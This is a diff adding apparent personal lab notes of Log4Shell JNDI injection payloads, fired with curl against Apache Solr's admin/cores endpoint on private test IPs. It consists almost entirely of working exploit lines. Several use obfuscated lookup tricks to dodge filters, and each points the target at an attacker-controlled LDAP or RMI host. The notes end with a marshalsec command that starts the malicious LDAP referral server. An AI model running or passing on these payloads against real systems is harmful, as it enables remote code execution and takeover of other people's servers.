@@ -1,0 +1,23 @@
+payloads:
+└─$ curl 'http://10.10.51.66:8983/solr/admin/cores?x=$\{jndi:ldap://10.23.90.153:1389/Exploit\}'
+ curl 'http://10.10.220.137:8983/solr/admin/cores?foo=$\{$\{env:ENV_NAME:-j\}ndi$\{env:ENV_NAME:-:\}$\{env:ENV_NAME:-l\}dap$\{env:ENV_NAME:-:\}//attacker-endpoint:1389/Exploit#\}'
+
+└─$ curl 'http://10.10.220.137:8983/solr/admin/cores?foo=$\{$\{lower:j\}ndi:$\{lower:l\}$\{lower:d\}a$\{lower:p\}://10.23.90.153:1389/Exploit/#\}'
+
+
+curl 'http://10.10.220.137:8983/solr/admin/cores?foo=$\{$\{upper:j\}ndi:$\{upper:l\}$\{upper:d\}a$\{lower:p\}://10.23.90.153:1389/Exploit/#\}'  #Not Working 
+
+
+curl 'http://10.10.220.137:8983/solr/admin/cores?foo=$\{$\{::-j\}$\{::-n\}$\{::-d\}$\{::-i\}:$\{::-l\}$\{::-d\}$\{::-a\}$\{::-p\}://10.23.90.153:1389/Exploit/#\}' 
+
+curl 'http://10.10.194.86:8983/solr/admin/cores?foo=$\{$\{env:BARFOO:-j\}ndi$\{env:BARFOO:-:\}$\{env:BARFOO:-l\}dap$\{env:BARFOO:-:\}//10.23.90.153:1389/Exploit/#\}' working asw
+
+curl 'http://10.10.194.86:8983/solr/admin/cores?x=$\{$\{lower:j\}$\{upper:n\}$\{lower:d\}$\{upper:i\}:$\{lower:r\}m$\{lower:i\}\}://10.23.90.153:1389/Exploit/#\}' #Not working
+
+curl 'http://10.10.194.86:8983/solr/admin/cores?x=$\{$\{::-j\}ndi:rmi://10.23.90.153:1389/Exploit/\}'
+
+
+┌──(vernical㉿vernical)-[~/Downloads/marshalsec]
+└─$ jdk1.8.0_181/bin/java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://10.23.90.153:8000/#Exploit 1389
+
+
